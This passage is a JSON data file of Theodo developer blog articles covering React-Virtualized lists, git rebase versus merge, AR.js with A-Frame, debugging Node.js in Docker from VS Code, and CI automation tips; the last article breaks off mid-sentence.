{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhy\nWhat is a Virtual DOM ?\nThe virtual DOM (VDOM) is a programming concept where an ideal, or \u201cvirtual\u201d, representation of a UI is kept in memory.\nThen, it is\u00a0synced with the \u201creal\u201d DOM by a library such as ReactDOM. This process is called\u00a0reconciliation.\nPerformance\u00a0and\u00a0windowing\nYou might know that React uses this virtual DOM. Thus, it is only when React renders elements that the user will have them into his/her HTML DOM.\nSometimes you might want to display a lot of html elements, like for grids,\u00a0lists, calendars, dropdowns etc and the user will often complain about performance.\n\nHence, a good way\u00a0to display a lot of information is to \u2018window\u2019\u00a0it. The idea is to create only elements the user can see. An example is the Kindle vs Book. While the book is a heavy object because it \u2018renders\u2019 all the pages, the Kindle only display what the user can see.\nReact-Virtualized\nThat is how Brian Vaughn came up with the idea of creating React-Virtualized.\nIt is an open-source library which provides you many components in order to window some of your application List, Grid etc\nAs a developer, you do not want to reinvent the wheel. React-virtualized is a stable and maintained library. Its community is large and as it is open-source, many modules and extensions are already available in order to window a maximum of elements.\nFurthermore, it offers lots of functionalities and customization that you would not even think about.\nWe will discuss about it later, but before, let\u2019s see when to use React-virtualized.\nWhen\nWhen thinking about performance, lots of actions can be taken, but\u00a0React official website\u00a0already got a complete article to be read. In consequence, if you face a performance problem, be sure you have already done all of these before to start to window your application (but stay pragmatic).\nHow\nGetting into it\nOk, now that you\u2019re convinced, let\u2019s go throught the real part.\n\nYou can begin by following instructions for installing the right package via npm and look at simple examples here : React virtualized github.\u00a0However,\u00a0I\u2019m going to show you a complex example so you can use React-Virtualized in an advanced way.\nReact-Virtualized 101\nTo render a windowed list, no need for digging one hour a complex documentation, React-Virtualized is very simple to use.\nFirstly, you use the List component from the library, then, the few important props are the next one:\n\nwidth: the width of the List\nheight: the height of the List\nrowCount: the number of elements you will display\nrowHeight: the height of each row you will display\nrowRenderer: a callback method to define yourself depending on what you want to do with your data. This method is the core of your list, it is here that you define what will be rendered thanks to your data.\n\nThe example\n\r\nimport React from 'react';\r\nimport { List } from 'react-virtualized';\r\n\r\n// List data as an array of strings\r\nconst list = [\r\n 'Easy windowing1',\r\n 'Easy windowing2',\r\n // And so on...\r\n];\r\n\r\nfunction rowRenderer({\r\n key, // Unique key within array of rows\r\n index, // Index of row within collection\r\n isScrolling, // Used for performance\r\n isVisible, // Used for performancee\r\n style, // Style object to be applied to row (to position it)\r\n}) {\r\n return (\r\n\r\n<div key={key} style={style}>\r\n   {list[index]}\r\n </div>\r\n\r\n );\r\n}\r\n\r\n// Render your list\r\nconst ListExample = () => (\r\n <List width={300} height={300} rowCount={list.length} rowHeight={20} rowRenderer={rowRenderer} />\r\n);\r\n\nClick here to see a demo\nA more complex virtualized list:\nDisplay a virtualized list might be easy, but you might have a complicated behaviour to implement.\n\nIn this advanced example, we will:\n\nUse the AutoSizer HOC to automatically calculate the size the List will fill\nBe able to display row with a dynamic height using the CellMeasurer\nBe able to use the CellMeasurer even if the data are not static\n\nThis advanced example goes through 4 steps:\n\nInstantiate the AutoSizer and List component\nSee how the CellMeasurer and the CellMeasurerCache work\nLearn how we use them in the rowRenderer\nGo further with using these on a list that does not contain a stable number of elements\n\nThe example\nLet\u2019s look first at how we render the list:\n\u00a0\n\r\nimport {\r\n AutoSizer,\r\n List,\r\n CellMeasurer,\r\n CellMeasurerCache,\r\n} from 'react-virtualized';\r\n...\r\n<AutoSizer>\r\n {({ height, width }) => (\r\n  <List\r\n    width={width}\r\n    height={height}\r\n    rowGetter={({ index }) => rows[index]}\r\n    rowCount={1000}\r\n    rowHeight={40}\r\n    rowRenderer={this.rowRenderer}\r\n    headerHeight={20}\r\n  />\r\n )}\r\n</AutoSizer>\r\n\nIt is very simple:\n\nWe wrap the list with the AutoSizer HOC\nIt uses the CellMeasurerCache to know the height of each row and the rowRenderer to render the elements.\n\nHow it works :\nFirst, you instantiate a new CellMeasurerCache that will contain all the calculated heights :\n\r\nconstructor(props) {\r\n super(props);\r\n this.cache = new CellMeasurerCache({ //Define a CellMeasurerCache --> Put the height and width you think are the best\r\n defaultHeight: 80,\r\n minHeight: 50,\r\n fixedWidth: true,\r\n });\r\n}\r\n\nThen, you use the CellMeasurer in the rowRenderer method:\n\r\nrowRenderer = ({\r\n   key, // Unique key within array of rows\r\n   index, // Index of row within collection\r\n   parent,\r\n   isScrolling, // The List is currently being scrolled --> Important if you need some perf adjustment\r\n   isVisible, // This row is visible within the List (eg it is not an overscanned row)\r\n   style, // Style object to be applied to row (to position it)\r\n}) => (\r\n   <CellMeasurer\r\n     cache={this.cache}\r\n     columnIndex={0}\r\n     key={key}\r\n     parent={parent}\r\n     rowIndex={index}\r\n   >\r\n   <div\r\n     className=\"Row\"\r\n     key={key}\r\n     style={{\r\n       ...style,\r\n       display: 'flex',\r\n     }}\r\n   >\r\n     <span style={{ width: 400 }}>{rows[index].name}</span>\r\n     <span style={{ width: 100 }}>{rows[index].age}</span>\r\n   </div>\r\n   </CellMeasurer>\r\n);\r\n\n\u00a0\nPitfall:\nFinally, we obtain a nice windowed list, ready to be deployed and used\u2026\nUnless your application contain filters or some data added dynamically.\nActually, when I implemented this, after using some filters, some blank spaces were staying in the list.\nIt is a performance consideration due to the fact we use a cache, but it is a good compromise unless you have many rows and many columns in a Grid (as we display a list, we only have 1 column).\nConsequently, I managed to fix this issue by clearing the cache every time my list had its data reloaded:\n\r\ncomponentWillReceiveProps() { //Really important !!\r\n this.cache.clearAll(); //Clear the cache if row heights are recompute to be sure there are no \"blank spaces\" (some row are erased)\r\n this.virtualizedList && this.virtualizedList.recomputeRowHeights(); //We need to recompute the heights\r\n}\r\n\nA big thanks to\u00a0Brian Vaughn\u00a0for this amazing library\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCyril Gaunet\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThanks to a new colleague of mine, I have learned how to make my git history cleaner and more understandable. \nThe principle is simple: rebase your branch before you merge it. But this technique also has weaknesses. In this article, I will explain what a rebase and a merge really do and what are the implications of this technique.\nBasically, here is an example of my git history before and after I used this technique.\n\nStay focus, rebase and merge are no joke! \nWhat is the goal of a rebase or a merge ?\nRebase and merge both aim at integrating changes that happened on another branch into your branch.\nWhat happens during a merge ?\nFirst of all there are two types of merge:\n\nFast-forward merge\n3-way merge\n\nFast-forward merge\nA fast-forward merge happens when the most recent shared commit between the two branches is also the tip of the branch in which you are merging.\nThe following drawing shows what happens during a fast-forward merge and how it is shown on a graphical git software.\nA: the branch in which you are merging\nB: the branch from which you get the modifications\n\ngit checkout A\ngit merge B\n\n\nAs you can see, git simply brings the new commits on top of branch A. After a fast-forward merge, branches A and B are exactly the same.\nNotes:\n\ngit checkout A, git rebase B you would have had the exact same result!\ngit checkout B, git merge A would have left the branches in the \u201cbefore\u201d situation, since branch A has no new commits for branch B.\n\n3-way merge\nA 3-way merge happens when both branches have had new commits since the last shared commit.\nThe following drawing shows what happens during a 3-way merge and how it is shown in a graphical git software.\nA: the branch in which you are merging\nB: the branch from which you get the modifications\n\ngit checkout A\ngit merge B\n\n\nDuring a 3-way merge, git creates a new commit named \u201cmerge commit\u201d (in orange) that contains:\n\nAll the modifications brought by the three commits from B (in purple)\nThe possible conflict resolutions\n\nGit will keep all information about the commits of the merged branch B even if you delete it. On a graphical git software, git will also keep a small loop to represent the merge.\nThe default behaviour of git is to try a fast-forward merge first. If it\u2019s not possible, that is to say if both branch have had changes since the last shared commit, it will be a 3-way merge.\nWhat happens during a rebase?\nA rebase differ from a merge in the way in which it integrates the modifications.\nThe following drawings show what happens during a rebase and how it is shown in a graphical git software.\nA: the branch that you are rebasing\nB: the branch from which you get the new commits\n\ngit checkout A\ngit rebase B\n\n\n\nWhen you rebase A on B, git creates a temporary branch that is a copy of branch B, and tries to apply the new commits of A on it one by one.\nFor each commit to apply, if there are conflicts, they will be resolved inside of the commit.\nAfter a rebase, the new commits from A (in blue) are not exactly the same as they were:\n\nIf there were conflicts, those conflicts are integrated in each commit\nThey have a new hash\n\nBut they keep their original date which might be confusing since in the final branch, commits in blue were created before the two last commits in purple.\nWhat is the best solution to integrate a new feature into a shared branch and keep your git tree clean?\nLet say that you have a new feature made of three new commits on a branch named `feature`. You want to merge this branch into a shared branch, for exemple `master` that has received two new commits since you started from it.\nYou have two main solutions: \nFirst solution: \n\ngit checkout feature\ngit rebase master\ngit checkout master\ngit merge feature\n\n\nNote : Be careful, git merge feature should do a fast-forward merge, but some hosting services for version control do a 3-way merge anyway. To prevent this, you can use git merge feature \u2013ff-only\nSecond solution:\n\ngit checkout master\ngit merge feature\n\n\nAs you can see, the final tree is more simple with the first solution. You simply have a linear git history. On the opposite, the second solution creates a new \u201cmerge commit\u201d and a loop to show that a merge happened.\nIn this situation, the git tree is still readable, so the advantage of the first solution is not so obvious. The complexity emerges when you have several developers in your team, and several feature branches developed at the same time. If everyone uses the second solution, your git tree ends up complex with several loop, and it can even be difficult to see which commits belong to which branch!\nUnfortunately, the first solution has a few drawbacks:\nHistory rewriting\nWhen you use a rebase, like in the first solution, you \u201crewrite history\u201d because you change the order of past commits on your branch. This can be problematic if several developers work on the same branch: when you rewrite history, you have to use git push \u2013 \u2013 force in order to erase the old branch on the remote repository and put your new branch (with the new history) in its place.\nThis can potentially erase changes another developer made, or introduce conflicts resolution for him.\nTo avoid this problem, you should only rebase branches on which you are the only one working. For example in our case, if you are the only one working on the feature branch.\nHowever you might sometime have to rewrite history of shared branches. In this case, make sure that the other developers working on the branch are aware of it, and are available to help you if you have conflicts to resolve.\nThe obvious advantage of the 3-way merge here, is that you don\u2019t rewrite history at all.\nConflicts resolution\nWhen you merge or rebase, you might have to resolve conflicts.\nWhat I like about the rebase, is that the conflicts added by one commit will be resolved in this same commit. On the opposite, the 3-way merge will resolve all the conflicts into the new \u201cmerge commit\u201d, mixing all together the conflicts added by the different commits of your feature branch.\nThe only problem with the rebase is that you may have to resolve more conflicts, due to the fact that the rebase applies the commits of your branch one by one.\nConclusion\nTo conclude, I hope I have convinced you that rebasing your branch before merging it, can clear your git history a lot! Here is a recap of the advantages and disadvantages of the rebase and merge method versus the 3-way merge method:\n\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJ\u00e9r\u00e9mie Marniquet Fabre\r\n  \t\t\t\r\n  \t\t\t\tI am an agile web developer at Theodo, I enjoy outdoor sports (mountain biking, skiing...) and new technologies !  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIn this tutorial, you will see how to use ARjs on simple examples in order to discover this technology. You don\u2019t need any huge tech background in order to follow this tutorial.\n1 \u2013 Your very first AR example\nFirst we will start with a simple example that will help us understand all the elements we need to start an ARjs prototype.\nLibrary import\nAs I wished to keep it as simple as possible we will only use html static files and javascript libraries. Two external librairies are enough to start with ARjs.\nFirst we need A-Frame library, a web-framework for virtual reality. It is based on components that you can use as tag once defined.\nYou can import A-Frame library using the folowing line :\n<script src=\"https://aframe.io/releases/0.6.1/aframe.min.js\"></script>\r\n\nThen we need to import ARjs, the web-framework for augmented reality we are going to use.\n<script src=\"https://cdn.rawgit.com/jeromeetienne/AR.js/1.5.0/aframe/build/aframe-ar.js\"></script>\r\n\nInitialize the scene\nA-Frame works using a scene that contains the elements the user wants to display. To create a new scene, we use the a-scene tag :\n<a-scene stats embedded arjs='trackingMethod: best; debugUIEnabled: false'>\r\n  <!-- All our components goes here -->\r\n</a-scene>\r\n\nNote the 2 elements we have in our a-scene tag :\n\nstats : it displays stats about your application performance. You are free to remove it, but to start it will give us some useful information.\narjs : Here you can find some basic ARjs configuration. trackingMethod is the type of camera tracking you use, here we have choosen which is an auto configuration that will be great for our example. And debugUIEnabled is set at false in order to remove debugging tools from the camera view.\n\nShape\nThen we will use our first a-frame component. A-frame is built around a generic component a-entity that you use and edit to have the behaviour you want.\nIn this demo, we want to display a cube. Thankfully a components exists in A-frame, already implemented, that can be used to do that :\n<a-box position=\"0 0 0\" rotation=\"0 0 0\"></a-box>\r\n\na-box has a lot of attributes on which you can learn more in the official documentation, here we will focus on two attributes :\n\nposition : the three coordinates that will be used to position our components\nrotation : that color of the shape\n\nMarker\nWe are going to use a Hiro marker to start. It is a special kind of marker designed for augmented reality. We will dig deeper into other markers in one of the following part.\n\nDeployment\nAs announced we want to make our application accessible from a mobile device, so we will need to deploy our web page and make it accessible from our smartphone.\nhttp-server\nThere are a lot of node modules that you can use to start a development web server, I choose to use http-server which is very simple and can be used with a single command line.\nFirst you need to install the module by running the following command\nnpm install -g http-server\r\n\nThen to launch your server, you can do it with the command line :\nhttp-server\r\n\nYou can use other tools, such as the python based SimpleHTTPServer which is natively available on macOS with the following command:\npython -m SimpleHTTPServer 8000\r\n\nngrok\nNow that your server is running, you need to make your webpage accessible for your mobile device. We are going to use ngrok. It is a very simple command line tool that you can download from here : https://ngrok.com/download.\nThen you use ngrok with the following command :\nngrok http 8080\r\n\nIt will redirect all connections to the address : http://xxxxxx.ngrok.io, directly toward your server and your html page.\nSo with our index.html containing the following :\n<!doctype HTML>\r\n<html>\r\n<script src=\"https://aframe.io/releases/0.6.1/aframe.min.js\"></script>\r\n<script src=\"https://rawgit.com/donmccurdy/aframe-extras/master/dist/aframe-extras.loaders.min.js\"></script>\r\n<script src=\"https://cdn.rawgit.com/jeromeetienne/AR.js/1.5.0/aframe/build/aframe-ar.js\"> </script>\r\n  <body style='margin : 0px; overflow: hidden;'>\r\n    <a-scene stats embedded arjs='trackingMethod: best;'>\r\n      <a-marker preset=\"hiro\">\r\n      <a-box position='0 1 0' material='color: blue;'>\r\n      </a-box>\r\n      </a-marker>\r\n      <a-entity camera></a-entity>\r\n    </a-scene>\r\n  </body>\r\n</html>\r\n\nOr if you prefer on codepen.\nAnd the result should look like :\n\n2 \u2013 Animation\nNow that we were able to display our first A-frame component, we want to make it move.\nA-frame contains a component a-animation that has been designed to animate an entity. As A-frame uses tag components, the a-animation has to be inside the entity tag that you want to animate :\n  <a-entity>\r\n    <a-animation></a-animation>\r\n  </a-entity>\r\n\na-animation can be used on various attributes of our entity such as position, rotation, scale or even color.\nWe will see in the next part what can be done with these attributes.\nBasics\nFirst we will focus on some basic elements that we will need but you will see that it is enough to do a lot of things.\n\ndur : duration of the animation\nfrom : start position or state of the animation\nto : end position or state of the animation\nrepeat : if and how the animation should be repeated\n\nPosition\nWe will begin with the position, we want our object to move from one position to another. To start with this animation, we only need a 3 dimension vector indicating the initial position and the final position of our object.\nOur code should look like this :\n<a-animation attribute=\"position\"\r\n    dur=\"1000\"\r\n    from=\"1 0 0\"\r\n    to=\"0 0 1\">\r\n</a-animation>\r\n\nRotation\nRotations work the same, except that instead of a vector you have to indicate three angles :\n<a-animation attribute=\"rotation\"\r\n    dur=\"2000\"\r\n    from=\"0 0 0\"\r\n    to=\"360 0 0\"\r\n    repeat=\"indefinite\">\r\n</a-animation>\r\n\nYou can either make your entity rotate on itself:\n\nYou can access the full code here.\nOr make it rotates around an object:\n\nAnd the full code is here.\nOthers properties\nThis animation pattern works on a lot of others properties, for example :\n\nScale :\n\n<a-animation\r\n    attribute=\"scale\"\r\n    to=\"2 2 3\">\r\n</a-animation>\r\n\n\nColor :\n\n<a-animation\r\n    attribute=\"color\"\r\n    to=\"red\">\r\n</a-animation>\r\n\nTrigger\na-animation has a trigger : begin. That can either be used with a delay or an event. For example :\n<a-animation\r\n    begin=\"3000\"\r\n    attribute=\"color\"\r\n    to=\"red\">\r\n</a-animation>\r\n\nThis animation will start in 3000ms.\nOtherwise with an event you can use :\n<a-entity id=\"entity\">\r\n<a-animation\r\n    begin=\"colorChange\"\r\n    attribute=\"color\"\r\n    to=\"red\">\r\n</a-animation>\r\n\nWith the event emission :\ndocument.querySelector('#entity').emit('colorChange');\r\n\nCombining\nYou can of course, use multiple animations either by having multiple entities with their own animations or by having imbricated entities that share animation.\nFirst case is very simple you only have to add multiple entities with an animation for each.\nSecond one is more difficult because you must add an entity inside an entity, like in this example :\n<a-entity>\r\n    <a-animation attribute=\"rotation\"\r\n      dur=\"2000\"\r\n      easing=\"linear\"\r\n      from=\"0 0 0\"\r\n      to=\"0 360 0\"\r\n      repeat=\"indefinite\"></a-animation>\r\n          <a-entity rotation=\"0 0 25\">\r\n              <a-sphere position=\"2 0 2\"></a-sphere>\r\n          </a-entity>\r\n</a-entity>\r\n\nThe first entity is used as the axis for our rotating animation.\n3 \u2013 Model loading\nType of models\nYou can also load a 3D model inside ARjs and project it on a marker. A-frame works with various models type but glTF is privilegied so you should use it.\nYou can generate your model from software like Blender. I have not so much experience in this area, but if you are interested you should give a look at this list of tutorials: https://www.blender.org/support/tutorials/\nYou can also use an online library to download models, some of them even allow you to directly use their models.\nLoading a model from the internet\nDuring the building of this tutorial, I found KronosGroup github that allow me to made my very first examples with 3d model. You can find all their work here : https://github.com/KhronosGroup/glTF-Sample-Models\nWe will now discover a new component from A-frame : a-asset. It is used to load your assets inside A-frame, and as you can guess our 3d model is one of our asset.\nTo load your 3d model, we will use the following piece of code :\n<a-assets>\r\n      <a-asset-item id=\"smiley\" src=\"https://cdn.rawgit.com/KhronosGroup/glTF-Sample-Models/9176d098/1.0/SmilingFace/glTF/SmilingFace.gltf\"></a-asset-item>\r\n</a-assets>\r\n\nYou can of course load your very own model the same way.\na-asset works as a container that will contain the a-asset-item you will need in your page. Those a-asset-item are used to load 3d model.\nThe full example look like this.\nDisplay your model\nNow that we have loaded our model, we can add it into our scene and start manipulating it. To do that we will need to declare an a-entity inside our a-scene that will be binded to the id of our a-asset-item. The code look like :\n<a-entity gltf-model=\"#smiley\" rotation= \"180 0 0\">\r\n</a-entity>\r\n\nRemember what we did in the previous part with animation. We are still working with a-entity so we can do the same here. The full code for our moving smiley is here.\nAnd here is a demo :\n\n4 \u2013 Markers\nFor now we only have used Hiro marker, now we will see how we can use other kind of marker.\nBarcode\nIn ARjs barcode are also implemented in case you need to have a lot of different marker without waiting to create them from scratch. You first need to declare in the a-scene component what kind of marker you are looking for :\n<a-scene arjs='detectionMode: mono_and_matrix; matrixCodeType: 5x5;'></a-scene>\r\n\nAs you can guess, our value will be found in a 5\u00d75 matrix. And now the a-marker component will look like :\n<a-marker type='barcode' value='5'></a-marker>\r\n\nCustom marker\nYou can also use your very own custom marker. Select the image you want, and use this tool developed by ARjs developer.\nYou can then download the .patt file and you can use it in your application, like this:\n<a-marker-camera type='pattern' url='path/to/pattern-marker.patt'></a-marker-camera>\r\n\nMultiple markers\n<script src=\"https://aframe.io/releases/0.6.0/aframe.min.js\"></script>\r\n<script src=\"https://jeromeetienne.github.io/AR.js/aframe/build/aframe-ar.js\"></script>\r\n<body style='margin : 0px; overflow: hidden;'>\r\n  <a-scene embedded arjs='sourceType: webcam;'>\r\n\r\n    <a-marker type='pattern' url='path/to/pattern-marker.patt'>\r\n      <a-box position='0 0.5 0' material='color: red;'></a-box>\r\n    </a-marker>\r\n\r\n\r\n    <a-marker preset='hiro'>\r\n      <a-box position='0 0.5 0' material='color: green;'></a-box>\r\n    </a-marker>\r\n\r\n\r\n    <a-marker type='barcode' value='5'>\r\n      <a-box position='0 0.5 0' material='color: blue;'></a-box>\r\n    </a-marker>\r\n\r\n\r\n    <a-entity camera></a-entity>\r\n  </a-scene>\r\n</body>\r\n\nWhat\u2019s next\nYou now have everything you need to start and deploy a basic AR web application using ARjs.\nIf you are interested in web augmented or virtual reality you can give a deeper look at the A-Frame library so that you will see you can build more custom component or even component you can interact with.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBastien Teissier\r\n  \t\t\t\r\n  \t\t\t\tWeb developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis is a quick guide on how to set up the debugger in VS code server-side for use with Node.js in a Docker container. I recently worked on a project which uses the Koa.js framework as the API. Whilst trying to set up the debugger with VS code, a google search led to several articles that had conflicting information about how to set it up and the port number to expose, or was overly verbose and complicated.\nTo keep things simple, I have split this into 3 steps.\n1) Check version of Node.js on\u00a0server\nTo do this with docker-compose set up, use the following, replace [api] with the name of your\u00a0docker container.\ndocker-compose exec api\u00a0node --version\nInspector\u00a0Protocol\u00a0(Node V7+, since Oct 2016)\nRecent versions of Node.js now uses the inspector protocol. This is easier to set up and is the default setting for new Node.js applications, as most documentation will refer to this protocol. This means that:\n\nThe --inspect flag is required when starting the node process.\nBy default, the port 9229 is exposed, and is equivalent to --inspect:9229\nThe port can be changed, eg. --inspect-brk:1234 . Here, the \u2018-brk\u2019 flag adds a breakpoint on start.\n\nLegacy\u00a0Protocol (Node V6 and earlier)\nOlder versions of Node.js (prior to V7) uses the \u2018Legacy Debugger\u2019. The version of Node.js used on my project was 6.14. This means that:\n\nThe\u00a0--debug\u00a0flag is required when starting the node process.\nBy default, the port 5858 is exposed, and is equivalent to\u00a0--debug:5858\nThis port cannot be changed.\n\nFor more information goto:\nhttps://code.visualstudio.com/docs/nodejs/nodejs-debugging\nhttps://nodejs.org/en/docs/guides/debugging-getting-started/\n2) Expose port in Node and Docker\nIn \u2018package.json\u2019, add\u00a0--debug:5858\u00a0 (or\u00a0--inspect:9229\u00a0depending on Node version) when starting Node, so:\n\"dev\": \"nodemon index.js\",\u00a0becomes\n\"debug\": \"nodemon --debug:5858 index.js\",\nIn \u2018docker-compose.yml\u2019, run the debug node command\u00a0and expose the port. In my case:\napi:\nbuild: ./api\ncommand: yarn dev\nvolumes:\n- ./api:/code\nports:\n- \"4000:4000\"\nbecomes:\napi:\nbuild: ./api\ncommand: yarn debug\nvolumes:\n- ./api:/code\nports:\n- \"4000:4000\"\n- \"5858:5858\"\n3)\u00a0Set launch configuration of Debugger\nIn \u2018/.vscode/launch.json\u2019, my launch configuration is:\n{\n\"type\": \"node\",\n\"request\": \"attach\",\n\"name\": \"Docker: Attach to Node\",\n\"port\": 5858,\n\"address\": \"localhost\",\n\"localRoot\": \"${workspaceFolder}/api/\",\n \"remoteRoot\": \"/code/\",\n\"protocol\": \"legacy\"\n}\nThe port and protocol needs to correspond to the version of Node used as determine above. For newer versions of Node:\u00a0\"port\": \"9229\" and \"protocol\": \"inspector\" should be used.\n\u201clocalRoot\u201d and \u201cremoteRoot\u201d should be set to the folder corresponding to the entry point (eg. index.js) of your Node application in the local repository and the docker folder respectively.\n4) Attach debugger and go!\nIn VS code, set your breakpoints and press F5 or click the green triangle button to start debugging! By default VS code comes with a debug panel to the left and debug console to the bottom, and a moveable debug toolbar. Mousing over a variable shows its values if it has any.\n\n\u00a0\nI hope this article has been useful, and thanks for reading my tech blog!\u00a0 \n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tHo-Wan To\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tStop wasting your time on tasks your CI could do for you.\nFind 4 tips on how to better use your CI in order to focus on what matters \u2013 and what you love: code. Let\u2019s face it: as a developer, a huge part of the value you create is your code.\nNote: Some of these tips use the GitHub / CircleCI combo. Don\u2019t leave yet if you use BitBucket or Jenkins! I use GitHub and CircleCi on my personal and work-related projects, so they are the tools I know best. But most of those tips could be set up with every CI on the market.\nTip 1: Automatic Changelogs\nI used to work on a library of React reusable components, like Material UI. Several teams were using components from our library, and with our regular updates, we were wasting a lot of time writing changelogs. We decided to use Conventional Commits. Conventional Commits is a fancy name for commits with a standardized name:\nexample of Conventional Commits\nThe standard format is \u201cTYPE(SCOPE): DESCRIPTION OF THE CHANGES\u201d. \nTYPE can be\n\nfeat: a new feature on your project\nfix: a bugfix\ndocs: update documentation / Readme\nrefactor: a code change that neither fixes a bug nor adds a feature\nor others\u2026\n\nSCOPE (optional parameter) describes what part of your codebase is changed within the commit.\nDESCRIPTION OF THE CHANGES is pretty much what you would write in a \u201ctraditional\u201d commit message. However, you can use keywords in your commit message to add more information. For instance:\nfix(SomeButton): disable by default to fix IE7 behaviour\r\nBREAKING CHANGE: prop `isDisabled` is now mandatory\nWhy is this useful? Three main reasons:\n\nAllow scripts to parse the commit names, and generate changelogs with them\nHelp developers thinking about the impact of their changes (Does my feature add a Breaking Change?)\nAllow scripts to choose the correct version bump for your project, depending on \u201chow big\u201d the changes in a commit are (bugfix: x.y.Z, feature: x.Y.z, breaking change: X.y.z)\n\nThis standard version bump calculation is called Semantic Versioning. Depending of the version bump, you can anticipate the impact on your app and the amount of work needed.\nBe careful though! Not everyone follows this standard, and even those who do can miss a breaking change! You should never update your dependencies without testing everything is fine \ud83d\ude09\nHow to set up Conventional Commits\n\nInstall Commitizen\nInstall Semantic Releases\nAdd GITHUB_TOKEN and NPM_TOKEN to the environment variables of your CI\nAdd `npx semantic-release` after the bundle & tests steps on your CI master/production build\nUse `git cz` instead of `git commit` to get used to the commit message standard\nSquash & merge your feature branch on master/production branch\n\nWhen you get used to the commit message standard, you can go back to `git commit`, but remember the format! (e.g: `git commit -m \u201cfeat: add an awesome feature\u201d`)\nNow, every developer working on your codebase will create changelogs without even noticing it. Plus, if your project is used by others, they only need a glance at your package version/changelog to know what changes you\u2019ve made, and if they are Breaking.\nTip 2a: Run parallel tasks on your CI\nWhy do I say task instead of tests? Because a CI can do a lot more than run tests! You can:\n\nGenerate automatic changelogs \ud83d\ude09 and version your project\nBuild and push the bundle on a release branch\nDeploy your app\nDeploy your documentation site\n\nThere are several ways to use parallelism to run your tasks.\nThe blunt approach\nThis simply consists of using the built-in parallelism of your tasks, combined with a multi-thread CI container.\nWith Jest, you can choose the number of workers (threads) to use for your test with the `\u2013max-workers` flag.\nWith Pytest, try xdist and the `-n` flag to split your tests on multiple CPUs.\nAnother way of parallelizing tests is by splitting the test files between your CI containers, as React tries to do it. However, I won\u2019t write about this approach in this article since the correct way of doing it is nicely explained in the CircleCi docs.\n\u00a0\nTip 2b: CircleCI Workflows\nWith Workflows, we reduced our CI Build time by 25% on feature branches (from 11\u2033 to 8\u203330) and by 30% on our master branch (from 16\u203330 to 11\u203330). With an average of 7 features merged on master a day, this is 1 hour and 30 minutes less waiting every day for our team.\nWorkflow is a feature of CircleCI. Group your tasks in Jobs, then order your Jobs how it suits your project best. Let\u2019s imagine you are building a library of re-usable React Components (huh, I think I\u2019ve already read that somewhere\u2026). Your CI:\n\nSets up your project (maybe spawn a docker, install your dependencies, build your app)\nRuns unit/integration tests\nRuns E2E tests\nDeploys your Storybook\nPublishes your library\n\nEach of those bullet points can be a Job: it may have several tasks in it, but all serve the same purpose. But do you need to wait for your unit tests to pass before launching your E2E tests? Those two jobs are independent and could be running on two different machines.\nOur CircleCI workflow\nExtract of our config.yml\nAs you can see, it is pretty straight-forward to re-order or add dependencies between steps. For more info on how to setup Workflows, check out the documentation.\nThis is also useful for cross-platform testing (you can take a look at Yarn\u2019s workflows).\nNote: Having trouble setting up a workflow? You can SSH on the machine during the build.\n\u00a0\nParallelization drawbacks\nBut be careful with the parallelism: resources are not unlimited; if you share your CI plan with other teams in your organization, make sure using more resources for parallelism will not be counter-productive at a larger scale. You can easily understand why using 2 machines for 10 minutes can be worse than using 1 machine for 15 minutes:\n\u00a0\nProject #2 is queued on CI because there is no machine free when the build was triggered\n\u00a0\nPlus, sharing the Workspace (the current state) of one machine to others (e.g: after running `yarn`, to make your dependencies installed for every job) costs time (both when saving the state on the first machine and loading it on the other).\nSo, when should I parallelize my CI tasks?\nA good rule of thumb is always keeping jobDuration > (nb_containers * workspaceSharingDuration).\nWorkspace sharing can take up to a minute for a large codebase. You should try several workflow configurations to find what\u2019s best for you.\n\u00a0\nTip 3: Set up cron(tab)s\nCrontabs help make your CI more reliable without making builds longer.\n\nWant to run in-depth performance tests that need to send requests to your app? Schedule it for night time with a cron!\nWant to publish a new version of your app every week? Cron.\nWant to train your ML model but it takes hours? Your CI could trigger the training every night.\n\nSome of you may wonder: what is a cron/crontab? Cron(tab) is an abbreviation of ChronoTable, a job scheduler. A cron is a program that executes a series of instructions at a given time. It can be once an hour, once a day, once a year\u2026\nI worked on a project in finance linking several sources of data and API\u2019s. Regression was the biggest fear of our client. If you give a user 